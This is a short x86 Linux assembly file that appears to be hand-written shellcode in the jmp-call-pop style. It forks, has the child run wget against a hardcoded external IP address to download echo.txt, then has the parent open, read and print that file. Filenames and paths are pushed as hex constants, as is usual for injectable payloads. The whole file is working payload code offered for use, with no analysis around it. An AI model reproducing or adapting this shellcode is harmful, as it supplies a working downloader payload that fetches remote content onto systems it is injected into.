;/***********************************************************************/
;/*Author	: Me							*/
;/*Date		: 27/05							*/
;/*Desc		: Download then read and print to the screen		*/
;/***********************************************************************/

global _start
section .text 
_start:	
	
	jmp call_shellcode
	
shellcode:

	;Fork
	push 0x02
	pop eax
	int 0x80
	xor ebx, ebx
	cmp eax, ebx
	jz Child
	
	
	;wait
	push 0x07
	pop eax	;wait sys
	int 0x80

	
	;let open the file
	xor ecx, ecx
	mul ecx
	push ecx
	
	;echo.txt
	push 0x7478742e
	push 0x6f686365
	mov ebx, esp
	mov al, 0x05
	int 0x80

	;read the file
	xchg ebx, eax
	xchg eax, ecx
	cdq
	mov al, 0x03
	mov dl, 0xFF
	int 0x80
	

	;Wrtie
	xchg edx, eax
	push 0x01
	pop ebx
	push 0x04
	pop eax
	int 0x80

	mov al, 0x01
	int 0x80

Child:
	
	pop ecx
	xor eax, eax
	push eax

	;Push /usr/bin/wget
	push 0x74656777
    	push 0x2f6e6962
    	push 0x2f727375
    	push 0x2f2f2f2f

	mov ebx, esp
	
	push eax
	mov edx, esp ; 0
	
	push ecx
	push ebx
	mov ecx, esp

	mov al, 11
	int 0x80
	
	push 0x01
	pop eax
	int 0x80

call_shellcode:
	call shellcode
	lien:		db	"http://81.192.48.152/rtfm/echo.txt"
